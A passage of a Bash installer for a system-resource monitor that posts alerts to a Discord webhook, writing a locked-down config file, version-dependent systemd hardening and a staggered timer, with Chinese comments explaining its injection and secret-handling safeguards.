  local paths=( $DISK_PATHS )
  IFS="$old_ifs"
  [[ ${#paths[@]} -gt 0 ]] || die "--disk-path 不可為空"
  # 正面表列：路徑會被內插進 JSON 字串，只放行不需要跳脫的字元集
  local path_re='^[A-Za-z0-9._/@+:-]+$'
  for p in "${paths[@]}"; do
    [[ -n "$p" ]] || die "--disk-path 含空白項目：$DISK_PATHS"
    [[ "$p" =~ $path_re ]] || die "--disk-path 只接受英數字與 . _ / @ + : - ：$p"
    [[ -d "$p" ]] || die "--disk-path 指定的路徑不存在或不是目錄：$p"
  done

  # --- 落地 ---
  mkdir -p "$CONFIG_DIR" "$STATE_DIR"
  chmod 700 "$CONFIG_DIR" "$STATE_DIR"

  # 先建檔並收權限，再寫入內容：避免 webhook URL 曾經以寬鬆權限短暫落地。
  : > "$CONFIG_FILE"
  chmod 600 "$CONFIG_FILE"
  chown root:root "$CONFIG_FILE" 2>/dev/null || true

  # 用 printf %q 寫入：設定檔會被 shell source，未跳脫的值等於一條 root 權限的
  # 命令注入路徑。webhook 已由 validate_webhook 擋過一次，這裡是第二道。
  {
    printf '# 由 sysmon-webhook install.sh %s 產生，請勿手動編輯\n' "$VERSION"
    printf 'WEBHOOK_URL=%q\n'     "$WEBHOOK_URL"
    printf 'SYS_NAME=%q\n'        "$SYS_NAME"
    # 監控腳本用不到 INTERVAL_MIN，但升級時要靠它還原 timer 的間隔
    printf 'INTERVAL_MIN=%q\n'    "$INTERVAL_MIN"
    printf 'CPU_THRESHOLD=%q\n'   "$CPU_THRESHOLD"
    printf 'MEM_THRESHOLD=%q\n'   "$MEM_THRESHOLD"
    printf 'SWAP_THRESHOLD=%q\n'  "$SWAP_THRESHOLD"
    printf 'DISK_THRESHOLD=%q\n'  "$DISK_THRESHOLD"
    printf 'INODE_THRESHOLD=%q\n' "$INODE_THRESHOLD"
    printf 'DISK_PATHS=%q\n'      "$DISK_PATHS"
    printf 'RECOVERY_MARGIN=%q\n' "$RECOVERY_MARGIN"
    printf 'REPORT_MODE=%q\n'     "$REPORT_MODE"
    printf 'HEARTBEAT_URL=%q\n'   "$HEARTBEAT_URL"
  } > "$CONFIG_FILE"

  monitor_source > "$BIN_PATH"
  chmod 755 "$BIN_PATH"
  failure_source > "$FAILURE_BIN"
  chmod 755 "$FAILURE_BIN"

  # --- systemd unit ---
  # 硬化選項依 systemd 版本分層寫入：舊版遇到不認得的 key 只會警告並忽略，
  # 但那些警告每次觸發都會刷 journal，不如按版本給。
  local hardening=""
  if [[ "$systemd_ver" -ge 232 ]]; then
    hardening=$(cat <<'HARD'
NoNewPrivileges=yes
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=read-only
ProtectKernelTunables=yes
ProtectControlGroups=yes
ReadWritePaths=/var/lib/sysmon-webhook
HARD
)
  elif [[ "$systemd_ver" -ge 214 ]]; then
    hardening=$(printf 'NoNewPrivileges=yes\nPrivateTmp=yes\nProtectSystem=full\nProtectHome=read-only\n')
  fi

  cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=System resource monitor -> Discord webhook
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=${BIN_PATH}
OnFailure=sysmon-webhook-failure.service
TimeoutStartSec=180
${hardening}

[Install]
WantedBy=multi-user.target
EOF

  cat > "$FAILURE_SERVICE_FILE" <<EOF
[Unit]
Description=Notify Discord that sysmon-webhook failed

[Service]
Type=oneshot
ExecStart=${FAILURE_BIN}
TimeoutStartSec=60
EOF

  # RandomizedDelaySec 讓多台機器不會在同一秒打同一個 webhook（Discord 有 rate limit）。
  # 取間隔的四分之一：60 分鐘 → 最多偏移 15 分鐘。
  local randomized=$(( INTERVAL_MIN * 60 / 4 ))
  [[ $randomized -lt 1 ]] && randomized=1

  # FixedRandomDelay 需要 systemd 247+：讓每台機器的偏移量固定，
  # 而不是每次觸發重抽（重抽會讓實際間隔在 interval ± delay 之間漂移）。
  local fixed_delay=""
  [[ "$systemd_ver" -ge 247 ]] && fixed_delay="FixedRandomDelay=yes"

  # 不設 Persistent=：systemd.timer(5) 明載該選項只對 OnCalendar= 有作用，
  # 對 OnUnitActiveSec= 是寫了也不會生效的裝飾。
  cat > "$TIMER_FILE" <<EOF
[Unit]
Description=Run sysmon-webhook every ${INTERVAL_MIN} minutes (staggered)

[Timer]
OnBootSec=2min
OnUnitActiveSec=${INTERVAL_MIN}min
RandomizedDelaySec=${randomized}
${fixed_delay}
AccuracySec=30s

[Install]
WantedBy=timers.target
EOF

  chmod 644 "$SERVICE_FILE" "$FAILURE_SERVICE_FILE" "$TIMER_FILE"

  systemctl daemon-reload
  systemctl enable sysmon-webhook.timer >/dev/null 2>&1
  systemctl restart sysmon-webhook.timer

  info ""
  if [[ "$upgrading" == "yes" ]]; then
    info "升級完成（既有設定已沿用，僅覆寫本次帶入的參數）。"
  else
    info "安裝完成。"
  fi
  if [[ "$no_test" == "yes" ]]; then
    info "已略過測試訊息（--no-test）。"
  else
    info "正在發送測試訊息…"
    if "$BIN_PATH" --install-test; then
      info "測試訊息已送出。"
    else
      info "測試訊息發送失敗。請檢查 webhook URL 與對外網路："
      info "  journalctl -u sysmon-webhook.service -n 30 --no-pager"
    fi
  fi

  info ""
  info "設定檔： ${CONFIG_FILE}（600，root only）"
  info "監控腳本：${BIN_PATH}"
  info "計時器： systemctl status sysmon-webhook.timer"
  info "下次執行：systemctl list-timers sysmon-webhook.timer"
  info "日誌：   journalctl -u sysmon-webhook.service"
  info "移除：   sudo bash install.sh --uninstall"

  if [[ -z "$HEARTBEAT_URL" ]]; then
    info ""
    info "提醒：未設定 --heartbeat-url。若這台機器整個離線或 timer 被停用，"
    info "      Discord 只會安靜下來，沒有任何訊息告訴你監控停了。"
  fi

  # 純參數安裝會把 webhook 留在三個地方，安裝完提醒一次，不然沒有人會想起來。
  # 只在這次真的用了 --webhook 時提醒；從既有設定檔沿用的升級不必再唸一遍。
  if [[ -n "$cli_webhook" ]]; then
    info ""
    info "提醒：webhook URL 可能已留在 ~/.bash_history、/var/log/auth.log 的 sudo"
    info "      記錄，以及安裝當下的 ps 輸出。Discord webhook 等同免認證的發文金鑰，"
    info "      正式機器請改用 --webhook-file，或安裝後清理 history 並輪換 webhook。"
  fi
}

# 整支腳本的實際動作都在 main() 裡、呼叫寫在最後一行：用 curl | bash 安裝時，
# 若下載中途斷線，bash 會因讀不到完整的函式定義而以語法錯誤中止，
# 不會出現「腳本被執行了一半」的狀態。
main "$@"
